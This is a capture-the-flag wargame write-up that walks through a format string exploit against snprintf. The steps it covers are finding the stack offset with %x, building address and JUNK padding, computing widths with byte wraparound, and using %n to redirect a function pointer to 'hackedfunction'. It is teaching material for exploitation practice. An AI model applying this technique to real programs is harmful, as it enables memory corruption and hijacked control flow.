**Description:**  
> This wargame is for the ones that want to learn basic exploitation. You can see the most common bugs in this game and we've tried to make them easy to exploit. You'll get the source code of each level to make it easier for you to spot the vuln and abuse it.  

##Write-up

> Let's go ahead and run the program and see what it does.

I guess you want to come to the hackedfunction...
Welcome to the goodfunction, but i said the Hackedfunction..

> Ok, it seems pretty obvious looking at this code that we need to change ```ptrf``` from pointing to ```goodfunction``` to ```hackedfunction```.  Our input appears to be passed in directly to the ```snprintf``` function and is being used as the format value.  Sounds like we will be working on another string format issue.  Let's poke around at that first.

> Well that definately worked.  We can see our ```0x41414141``` is popped off after 6 ```%x```.  So now we can setup for the writes.  We'll need to reference each byte of the memory that we want to overwrite, each separated by any four bytes.  Here we'll use ```JUNK``` from our example as it is 4 bytes.  After that, we'll need to try to determine what the first width of the first format string will be as it will allow us to write our first value to memory.  We can determine that by first seeing what value exists currently in memory with the standard width of ```%8x```.  Once we determine that, we can determine our actual width using ```"the byte to be written" - "the outputted byte" + 8```.  After translating that value to decimal we can set the width of the 5th ```%x``` which should be the ```%x``` right before our ```%n```.  This will effectively overwrite the first byte of memory with our desired value.  Let's see if it works.

> In this specific case the first byte we wanted to write was ```0x06``` and the byte that already resided in memory was ```0x3c```.  Since ```0x3c``` is larger than the byte we want to write, we will have to wrap it around to make it larger.  Essentially we did ```0x106 - 0x3c + 8``` instead of ```0x06 - 0x3c + 8```.  As we can see, this worked and we have successfully overwritten the first byte.  To calculate the next byte we will use the formula ```"the byte we want to write" - "the previous byte"```.  Again, if the byte we want to write is smaller than the previous byte we will need to wrap it to make it larger.  In this case we want to write ```0x87``` but the previous byte was ```0x106```, so we'll wrap the ```0x87``` to ```0x187``` and proceed with the formula.
